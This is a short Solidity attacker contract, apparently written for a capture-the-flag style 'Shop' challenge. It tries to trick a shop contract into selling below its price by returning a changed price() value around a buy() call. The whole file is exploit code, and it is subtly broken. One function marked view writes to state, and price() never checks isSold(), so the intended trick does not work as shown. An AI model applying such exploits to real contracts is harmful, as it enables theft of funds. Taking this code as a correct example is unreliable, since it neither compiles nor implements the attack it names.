pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract ExploitingAttacker {
    uint private attackerPrice;
    address public shop;

    constructor(address _shop) {
        shop = _shop;
    }

    function setPriceToBuyAgain() external {
        attackerPrice = Shop(shop).price();
        Shop(shop).buy();
        attackerPrice = Shop(shop).price();
    }

    function setPrice(uint newPrice) external {
        attackerPrice = newPrice;
    }

    function returnLowerPrice() external view {
        attackerPrice = Shop(shop).price() - 1;
    }

    function price() external view returns (uint256) {
        return attackerPrice;
    }
}
